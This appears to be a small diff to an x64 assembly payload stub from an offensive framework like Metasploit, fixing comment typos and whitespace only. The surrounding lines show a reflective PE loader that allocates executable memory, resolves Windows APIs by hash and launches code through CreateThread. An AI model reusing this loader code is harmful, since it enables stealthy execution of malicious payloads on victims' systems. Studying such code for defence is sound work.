@@ -15,13 +15,13 @@ stub:
 	sub [rsp],rsi                   ; Subtract the address of pre mapped PE image and get the image_size to R11
 	call start                      ; Call start
 	#{asm_block_api}
-start:                              ;
+start:                            ;
 	pop rbp                         ; Get the address of hook_api to rbp
 	mov eax,dword [rsi+0x3C]        ; Get the offset of "PE" to eax
 	mov rbx,qword [rax+rsi+0x30]    ; Get the image base address to rbx
 	mov r12d,dword [rax+rsi+0x28]   ; Get the address of entry point to r12
 	mov r9d,0x40                    ; PAGE_EXECUTE_READ_WRITE
-	mov r8d,0x00103000              ; MEM_COMMI | MEM_TOP_DOWN | MEM_RESERVE
+	mov r8d,0x00103000              ; MEM_COMMIT | MEM_TOP_DOWN | MEM_RESERVE
 	mov rdx,[rsp]                   ; dwSize
 	xor rcx,rcx                     ; lpAddress
 	mov r10d,#{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}             ; hash( "kernel32.dll", "VirtualAlloc" )
@@ -118,7 +118,7 @@ LoadLibraryA:
 	mov r10d,#{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}             ; ror13( "kernel32.dll", "LoadLibraryA" )
 	call rbp                        ; LoadLibraryA([esp+4])
 	add rsp,32                      ; Fix the stack
-	pop rcx                         ; Retreive ecx
+	pop rcx                         ; Retrieve ecx
 	ret                             ; <-
 GetProcAddress:
 	mov rcx,r13                     ; Move the module handle to RCX as first parameter
@@ -144,7 +144,7 @@ CreateThread:
 	push rax                        ; lpThreadId
 	push rax                        ; dwCreationFlags
 	mov r9,rax                      ; lpParameter
-	mov r8,r13                      ; lpstartAddress
+	mov r8,r13                      ; lpStartAddress
  	mov rdx,rax                     ; dwStackSize
 	mov rcx,rax                     ; lpThreadAttributes
 	mov r10d,#{Rex::Text.block_api_hash('kernel32.dll', 'CreateThread')}             ; ror13( "kernel32.dll","CreateThread" )
